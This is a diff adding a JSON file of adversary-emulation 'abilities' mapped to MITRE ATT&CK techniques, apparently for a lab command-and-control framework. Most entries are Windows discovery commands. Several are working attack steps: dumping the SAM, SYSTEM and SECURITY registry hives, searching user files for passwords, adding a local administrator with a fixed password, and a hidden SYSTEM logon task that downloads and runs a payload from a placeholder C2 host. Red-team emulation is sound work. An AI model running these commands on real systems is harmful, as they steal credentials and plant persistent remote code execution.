@@ -1,0 +1,155 @@
+{
+  "abilities": {
+    "T1033": {
+      "name": "System Owner/User Discovery",
+      "cmd": "whoami /all",
+      "tactic": "Discovery",
+      "severity": "low"
+    },
+    "T1087": {
+      "name": "Account Discovery",
+      "cmd": "net user; net localgroup administrators",
+      "tactic": "Discovery",
+      "severity": "low"
+    },
+    "T1016": {
+      "name": "Network Configuration Discovery",
+      "cmd": "ipconfig /all; route print",
+      "tactic": "Discovery",
+      "severity": "low"
+    },
+    "T1057": {
+      "name": "Process Discovery",
+      "cmd": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 15 Name,Id,CPU,Path",
+      "tactic": "Discovery",
+      "severity": "low"
+    },
+    "T1082": {
+      "name": "System Information Discovery",
+      "cmd": "systeminfo",
+      "tactic": "Discovery",
+      "severity": "low"
+    },
+    "T1049": {
+      "name": "Network Connections Discovery",
+      "cmd": "netstat -ano | Select-String 'ESTABLISHED'",
+      "tactic": "Discovery",
+      "severity": "low"
+    },
+    "T1018": {
+      "name": "Remote System Discovery",
+      "cmd": "arp -a",
+      "tactic": "Discovery",
+      "severity": "medium"
+    },
+    "T1083": {
+      "name": "File and Directory Discovery",
+      "cmd": "Get-ChildItem C:\\Users -Directory | Select-Object Name",
+      "tactic": "Discovery",
+      "severity": "medium"
+    },
+    "T1059.001": {
+      "name": "PowerShell Execution",
+      "cmd": "$PSVersionTable; Get-ExecutionPolicy -List",
+      "tactic": "Execution",
+      "severity": "medium"
+    },
+    "T1012": {
+      "name": "Query Registry",
+      "cmd": "Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue",
+      "tactic": "Discovery",
+      "severity": "medium"
+    },
+    "T1518": {
+      "name": "Software Discovery",
+      "cmd": "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object { $_.DisplayName } | Select-Object DisplayName,DisplayVersion | Select-Object -First 20",
+      "tactic": "Discovery",
+      "severity": "low"
+    },
+    "T1124": {
+      "name": "System Time Discovery",
+      "cmd": "Get-Date; Get-TimeZone",
+      "tactic": "Discovery",
+      "severity": "low"
+    },
+    "T1552.001": {
+      "name": "Credentials In Files",
+      "cmd": "Get-ChildItem C:\\Users -Recurse -Include *.txt,*.xml,*.config,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern 'password' -ErrorAction SilentlyContinue | Select-Object -First 10",
+      "tactic": "Credential Access",
+      "severity": "high"
+    },
+    "T1555": {
+      "name": "Credentials from Password Stores",
+      "cmd": "cmdkey /list",
+      "tactic": "Credential Access",
+      "severity": "high"
+    },
+    "T1053.005": {
+      "name": "Scheduled Task",
+      "cmd": "Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } | Select-Object TaskName -First 15",
+      "tactic": "Persistence",
+      "severity": "high"
+    },
+    "T1547.001": {
+      "name": "Registry Run Keys",
+      "cmd": "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue",
+      "tactic": "Persistence",
+      "severity": "high"
+    },
+    "T1562.001": {
+      "name": "Disable Security Tools (Detection Check)",
+      "cmd": "Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,AntivirusEnabled,BehaviorMonitorEnabled,IsTamperProtected",
+      "tactic": "Defense Evasion",
+      "severity": "critical"
+    },
+    "T1005": {
+      "name": "Data from Local System",
+      "cmd": "Get-ChildItem $env:USERPROFILE\\Desktop,$env:USERPROFILE\\Documents -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 10 FullName,Length",
+      "tactic": "Collection",
+      "severity": "high"
+    },
+    "T1490": {
+      "name": "Inhibit System Recovery",
+      "cmd": "vssadmin list shadows",
+      "tactic": "Impact",
+      "severity": "critical"
+    },
+    "T1105": {
+      "name": "Ingress Tool Transfer",
+      "cmd": "Write-Host 'T1105 default (payload injected at deploy time)'",
+      "tactic": "Command and Control",
+      "severity": "high"
+    },
+
+    "T1003.002": {
+      "name": "OS Credential Dumping - SAM",
+      "cmd": "reg save HKLM\\SAM $env:TEMP\\sam.hiv /y 2>&1; reg save HKLM\\SYSTEM $env:TEMP\\sys.hiv /y 2>&1; reg save HKLM\\SECURITY $env:TEMP\\sec.hiv /y 2>&1; 'SAM/SYSTEM/SECURITY hives saved to ' + $env:TEMP",
+      "tactic": "Credential Access",
+      "severity": "critical"
+    },
+    "T1003.004": {
+      "name": "OS Credential Dumping - LSA Secrets",
+      "cmd": "reg save HKLM\\SECURITY $env:TEMP\\lsa_sec.hiv /y 2>&1; 'LSA SECURITY hive saved to ' + $env:TEMP",
+      "tactic": "Credential Access",
+      "severity": "critical"
+    },
+    "T1078.001": {
+      "name": "Create Local Admin Account",
+      "cmd": "net user labadmin 'Passw0rd!123' /add 2>&1; net localgroup administrators labadmin /add 2>&1; net localgroup administrators",
+      "tactic": "Persistence",
+      "severity": "critical"
+    },
+    "T1543.003": {
+      "name": "Windows Service Enumeration",
+      "cmd": "Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 15 Name,DisplayName,Status",
+      "tactic": "Persistence",
+      "severity": "high"
+    },
+    "T1053.005.system": {
+      "name": "Scheduled Task Persistence (SYSTEM)",
+      "cmd": "schtasks /create /tn LabC2Persistence /tr \"powershell -nop -w hidden -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://__C2__/payload')\\\"\" /sc onlogon /ru SYSTEM /f 2>&1; schtasks /query /tn LabC2Persistence",
+      "tactic": "Persistence",
+      "severity": "critical"
+    }
+  }
+}
